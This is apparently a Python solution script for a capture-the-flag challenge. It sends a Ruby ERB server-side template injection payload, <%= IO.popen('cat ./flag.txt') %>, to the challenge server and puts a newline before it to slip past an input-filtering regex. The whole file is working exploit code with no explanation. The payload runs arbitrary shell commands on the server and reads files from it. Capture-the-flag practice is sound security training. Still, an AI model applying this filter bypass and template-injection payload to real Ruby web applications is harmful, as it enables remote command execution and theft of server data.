import requests
import urllib.parse as up

URL = "http://01.linux.challenges.ctf.thefewchosen.com:57588"
class Exploit:
    def __init__(self, param, url=URL):
        self.session = requests.Session()
        # self.session.proxies = {'http': 'http://localhost:8080'}
        self.param = param
        self.url = url
        
    def payloadAndBypass(self, malcode):
        '''bypass regex expression with newline (e.g. \\n)'''
        bypass = "asd\n"
        payload = bypass+malcode
        return {"input":payload}
    
    def start(self):
        r = self.session.post(self.url, data=self.payloadAndBypass(self.param))
        return r.text


param = """<%= IO.popen('cat ./flag.txt').readlines()  %>
"""


n = Exploit(param=param).start()
print(n)